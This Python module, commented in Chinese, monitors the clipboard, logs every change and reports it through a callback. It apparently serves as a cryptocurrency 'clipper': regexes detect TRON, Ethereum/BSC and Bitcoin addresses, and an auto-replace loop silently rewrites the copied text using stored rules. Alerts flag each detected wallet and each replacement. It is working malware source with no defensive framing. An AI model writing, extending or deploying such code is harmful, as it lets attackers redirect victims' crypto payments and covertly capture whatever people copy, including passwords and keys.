#!/usr/bin/env python3
"""剪切板监控替换"""
import threading
import time
import re
from typing import Optional, Callable, List
from dataclasses import dataclass
from datetime import datetime

@dataclass
class ClipboardEntry:
    timestamp: str
    content: str
    content_type: str

class ClipboardMonitor:
    """剪切板监控替换"""

    def __init__(self):
        self.monitoring = False
        self.history: list = []
        self.last_content = ""
        self.callback: Optional[Callable] = None
        self._thread = None
        self.replace_rules = {}

    def get_clipboard(self) -> str:
        """获取当前剪切板内容"""
        try:
            import pyperclip
            content = pyperclip.paste()
            if not content:
                return "📋 剪切板为空"
            return f"📋 **当前剪切板**\n━━━━━━━━━━━━━━━━━━━━━\n```\n{content[:2000]}\n```"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def set_clipboard(self, text: str) -> str:
        """设置剪切板内容"""
        try:
            import pyperclip
            pyperclip.copy(text)
            return f"✅ 已设置剪切板: `{text[:100]}{'...' if len(text) > 100 else ''}`"
        except Exception as e:
            return f"❌ 错误: `{str(e)}`"

    def add_replace_rule(self, pattern: str, replacement: str):
        """添加替换规则"""
        self.replace_rules[pattern] = replacement

    def start_monitor(self, callback=None, auto_replace: bool = False) -> str:
        """启动剪切板监控"""
        if self.monitoring:
            return "📋 剪切板监控已在运行"

        self.monitoring = True
        self.callback = callback

        def monitor_loop():
            while self.monitoring:
                try:
                    import pyperclip
                    current = pyperclip.paste()

                    if current and current != self.last_content:
                        self.last_content = current

                        # 检测钱包地址
                        wallet_info = self._detect_wallet(current)

                        # 自动替换
                        modified = current
                        if auto_replace and self.replace_rules:
                            for pattern, replacement in self.replace_rules.items():
                                modified = modified.replace(pattern, replacement)
                            if modified != current:
                                pyperclip.copy(modified)

                        entry = ClipboardEntry(
                            timestamp=datetime.now().strftime("%H:%M:%S"),
                            content=current[:500],
                            content_type="text"
                        )
                        self.history.append(entry)

                        if self.callback:
                            alert = f"📋 **剪切板更新**\n`{entry.timestamp}`\n```\n{current[:500]}\n```"
                            if wallet_info:
                                alert += f"\n\n⚠️ **检测到钱包地址**: `{wallet_info}`"
                            if modified != current:
                                alert += f"\n\n🔄 **已替换为**: `{modified[:200]}`"
                            self.callback(alert)

                except Exception as e:
                    print(f"Clipboard monitor error: {e}")

                time.sleep(0.5)

        self._thread = threading.Thread(target=monitor_loop, daemon=True)
        self._thread.start()
        return "📋 剪切板监控已启动"

    def stop_monitor(self) -> str:
        """停止监控"""
        self.monitoring = False
        return "🛑 剪切板监控已停止"

    def get_history(self, count: int = 20) -> str:
        """获取历史记录"""
        recent = self.history[-count:] if self.history else []
        if not recent:
            return "暂无记录"

        lines = []
        for entry in recent:
            lines.append(f"`[{entry.timestamp}]` `{entry.content[:80]}{'...' if len(entry.content) > 80 else ''}`")

        return "📋 **剪切板历史**\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)

    def _detect_wallet(self, text: str) -> Optional[str]:
        """检测文本中的钱包地址"""
        tron_pattern = r'T[1-9A-HJ-NP-Za-km-z]{33}'
        eth_pattern = r'0x[a-fA-F0-9]{40}'
        btc_pattern = r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}'

        for pattern, name in [(tron_pattern, "TRON"), (eth_pattern, "ETH/BSC"), (btc_pattern, "BTC")]:
            match = re.search(pattern, text)
            if match:
                return f"{name}: `{match.group()}`"
        return None

    def clear_history(self) -> str:
        """清空历史"""
        self.history.clear()
        return "🗑️ 剪切板历史已清空"
